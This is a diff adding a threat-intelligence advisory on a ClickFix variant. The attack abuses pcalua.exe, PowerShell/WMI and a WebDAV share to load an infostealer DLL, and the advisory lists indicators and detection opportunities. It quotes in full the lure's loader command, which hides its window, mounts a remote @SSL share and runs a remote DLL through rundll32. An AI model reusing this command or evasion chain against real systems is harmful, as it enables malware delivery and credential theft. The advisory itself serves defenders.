@@ -1,0 +1,69 @@
+2026-08-05 (WEDNESDAY): New ClickFix Variant Abuses the Legitimate Binary and WebDAV to Deploy Infostealer Capabilities 
+
+AUTHORS:
+
+- Raz Rubin, Guy Weiner, Khristine Barona
+
+NOTES:
+
+- A newly-observed ClickFix variant abuses the legitimate Windows binary pcalua.exe (Program Compatibility Assistant) as a launcher to bypass parent-process heuristics.
+- The victim is tricked (via a ClickFix lure) into pasting a crafted command that spawns PowerShell, uses WMI to create cmd.exe, mounts a remote WebDAV share, and loads a malicious DLL through rundll32.exe.
+- The WebDAV share is exposed over HTTPS via CDN-fronted infrastructure at a per-victim tokenized URL (UUIDv4 path) used to deliver malicious DLL.
+- Once loaded, the DLL is leveraged to deploy infostealer capabilities on the compromised host.
+- The same infrastructure has also been observed serving equivalent payloads under alternate filenames (e.g., "gz.keu","bn.js") — suggesting the same operator runs several concurrent payload tracks.
+
+DETAILS:
+
+- The initial command (from the ClickFix lure) invokes pcalua.exe to launch PowerShell:
+ - pcalua.exe -a "powershell" -c "s=([wmiclass]'Win32_ProcessStartup').CreateInstance();s.ShowWindow=0;([wmiclass]'Win32_Process').Create('cmd /v/c pushd \\<PAYLOAD_HOST>@SSL\ & rundll32 gc.key,#1',null,s)"
+- PowerShell instantiates a Win32_ProcessStartup COM object and sets ShowWindow=0 to hide the window.
+- It then uses Win32_Process.Create (via WMI) to spawn a hidden cmd.exe.
+- The parent-child chain observed on the endpoint is:
+ - pcalua.exe -> powershell.exe -> WmiPrvSE.exe -> cmd.exe -> rundll32.exe
+- The cmd.exe command uses "pushd" against a WebDAV UNC path (\@SSL<UUID>) which forces Windows to auto-mount the remote share via the WebClient service.
+ - The @SSL suffix instructs Windows to use HTTPS (port 443).
+ - Windows resolves this via davclnt.dll (WebDAV mini-redirector).
+- rundll32.exe is then invoked with the current directory set to the mounted UUID folder, loading "gc.key" as if it were a DLL and calling its export ordinal #1.
+- The following corroborating command is observed on the endpoint as the WebDAV mount is set up:
+ - rundll32.exe C:\WINDOWS\system32\davclnt.dll,DavSetCookie @SSL hxxps://[.]com/
+The remote WebDAV server responds with an HTTP 207 (Multi-Status)
+- Once loaded, the DLL executes infostealer functionality on the victim host.
+Infrastructure fingerprint:
+ - URL pattern: https://[random-subdomain].[apex]/[UUIDv4]
+ - Random subdomain observed as 4-9 lowercase alphanumeric characters (algorithmically generated).
+ - TLS certificates issued by Let's Encrypt (WE1), typically 0–40 days old at time of scan.
+
+INDICATORS:
+
+DOMAINS (WebDAV hosts observed delivering the payload):
+- hvao.jbgroup21[.]com
+- sutf.kafekarachi[.]com
+- cglp.cleantruckchecksac[.]com
+- Igsx.closedfistllc[.]com
+- hmvc.ridgerenovation[.]com 
+- dgctf.concretewestgj[.]com
+
+URLS (full delivery URLs — per-victim tokenized paths):
+- hxxps[:]//hvao.jbgroup21[.]com/60861fb4-c42e-4d32-9d1e-7f445fbb4fbe
+- hxxps[:]//sutf.kafekarachi[.]com/9f2d1350-68ae-425a-8161-cb99132f828d
+- hxxps[:]//cglp.cleantruckchecksac[.]com/675b759f-393e-4c37-9d92-92f3098f145e
+- hxxps[:]//igsx.closedfistllc[.]com/127c3bcd-412d-442c-bb65-395afc1c8977
+- hxxps[:]//dgctf.concretewestgj[.]com/7e06668f-b098-4430-afb9-0b5ba2c561f8 hxxps://hmvc.ridgerenovation[.]com/3dc45b30-111c-49fa-9657-9e53d4e089ae
+
+SHA256 (Malicious DLL):
+- 13a41f154e00a331049db462866533fcfe238e98ce6bcf2b6ed18cd96d0d1222
+- 68dda950df8971a2beef3f308a00d6c0ed9cc1873922a94930f5177867282b9f
+
+Main C2 Servers: 
+- vertexengine[.]cc
+- vectorplatform[.]cc
+
+PAYLOAD FILENAMES OBSERVED ON THIS INFRASTRUCTURE:
+- gc.key, gz.keu (spoofed PE DLL loaded by rundll32)
+
+DETECTION OPPORTUNITIES:
+- pcalua.exe as a parent process for powershell.exe.
+- powershell.exe using WMI (Win32_Process.Create) with ShowWindow=0 to spawn cmd.exe.
+- cmd.exe issuing "pushd" against a UNC path containing "@SSL" and a UUID directory.
+- rundll32.exe loading a file with a non-standard extension (e.g., .key) from a WebDAV mount.
+- WebClient service starting or being used to mount an @SSL WebDAV share not previously seen in the environment.
